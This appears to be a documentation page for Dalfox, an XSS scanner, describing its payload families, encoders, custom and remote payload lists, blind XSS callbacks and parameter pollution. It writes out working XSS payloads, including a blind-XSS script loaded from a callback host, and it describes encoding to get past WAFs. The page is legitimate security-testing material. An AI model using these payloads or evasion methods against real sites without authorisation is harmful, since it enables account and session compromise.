+++
title = "Payloads & Encoding"
description = "Built-in payload families, encoders, custom payloads, and remote wordlists."
weight = 3
+++

Dalfox ships with a curated, context-aware payload library. Most of the time you don't need to think about it — the engine picks the right payloads for each injection context. This page covers what's built in and how to extend it.

## Payload families

Dalfox composes payloads from several families:

| Family | Example | Used when |
|--------|---------|-----------|
| **HTML tag** | `<svg onload=alert(1)>` | HTML context |
| **Attribute breakout** | `'><img src=x onerror=alert(1)>` | Inside an attribute |
| **JavaScript** | `";alert(1);//` | Inside a `<script>` block |
| **Event handler** | `onmouseover=alert(1)` | Existing attribute value |
| **DOM clobbering** | `<img id=x>` | Legacy DOM lookups |
| **URL protocol** | `javascript:alert(1)` | `href`/`src`-like attributes |
| **CSP bypass** | Nonce exfil, fallback origins | When CSP is relaxed |
| **mXSS** | `<foreignobject>`/DOMPurify bypasses | Sanitizer-mutated DOM |
| **Blind** | `<script src=//callback/></script>` | `--blind` is set |

Each payload template carries a marker (`class={CLASS}` or `id={ID}`) so the verification stage can positively identify its own element in the DOM.

## Context-aware selection

During discovery Dalfox classifies each parameter by **injection context** — where the reflected value lands:

- HTML body → HTML/attribute-breakout payloads
- Inside a quoted attribute → attribute-breakout payloads
- Inside `<script>` → JS-breakout payloads
- Inside `<style>` → CSS payloads
- Unknown → fallback mix of HTML + attribute

This keeps request counts sane while maximising hit rate.

## Encoders

Encoders transform the *same payload* into multiple forms so the WAF and server-side filters don't all see the same bytes.

```bash
dalfox https://target.app -e url,html,base64
```

Available encoders:

| Encoder | Transforms `<` to |
|---------|-------------------|
| `none` | `<` (raw) |
| `url` | `%3C` |
| `2url` | `%253C` (double) |
| `3url` | `%25253C` (triple) |
| `4url` | quadruple URL |
| `html` | `&#x003c;` |
| `htmlpad` | zero-padded HTML entity |
| `base64` | base64 of payload |
| `unicode` | fullwidth mapping |
| `zwsp` | zero-width space insertion |

Defaults: `url,html`. If you add `none` to the list, Dalfox sends only the raw payloads.

## Custom payloads

Have your own list? One payload per line:

```bash
dalfox https://target.app --custom-payload mypayloads.txt
```

Swap out the built-in library entirely:

```bash
dalfox https://target.app --custom-payload mypayloads.txt --only-custom-payload
```

## Remote payload sources

Pull community wordlists on demand:

```bash
dalfox https://target.app --remote-payloads portswigger,payloadbox
```

Supported sources: `portswigger`, `payloadbox`. Fetched once per run, respecting `--proxy` and `--timeout`.

## Inspecting payloads

Print a payload family without running a scan:

```bash
dalfox payload event-handlers  # onerror, onmouseover, ...
dalfox payload useful-tags     # svg, img, script, ...
dalfox payload uri-scheme      # javascript:, data:, vbscript:
dalfox payload portswigger     # fetch + print remote list
```

## Customising the "alert"

The classic `alert(1)` can be loud. Swap it out so you can prove impact without popping dialogs everywhere:

```bash
dalfox https://target.app \
  --custom-alert-value "document.domain" \
  --custom-alert-type str
```

- `--custom-alert-value` — value passed to `alert`/`prompt`/`confirm` (default `1`).
- `--custom-alert-type` — `none` keeps the original function, `str` wraps the value in quotes.

## Blind XSS

Blind XSS fires later, in a context you can't see (an admin panel, a support agent's dashboard). You need an out-of-band listener:

```bash
dalfox https://target.app -b https://your-callback.interact.sh
```

Custom blind templates:

```bash
dalfox https://target.app \
  -b https://your-callback.example \
  --custom-blind-xss-payload blind-templates.txt
# each line may contain {} — replaced with the callback URL
```

## HPP — Parameter Pollution

Some filters only inspect the *first* occurrence of a parameter. Dalfox can duplicate parameters to slip a payload into the second slot:

```bash
dalfox https://target.app --hpp
```

## Deep scan

By default Dalfox stops testing a parameter once it finds a verified payload. `--deep-scan` keeps going:

```bash
dalfox https://target.app --deep-scan
```

Useful for research; slower for production pipelines.

## Skipping payload stages

| Flag | Effect |
|------|--------|
| `--skip-xss-scanning` | Only discover and probe — no payload injection |
| `--skip-ast-analysis` | Skip AST-based DOM-XSS detection |

## Next

- Pair this with [WAF Bypass](../waf-bypass/) to bend payloads around filters.
- See [Output &amp; Reports](../output/) to export findings.
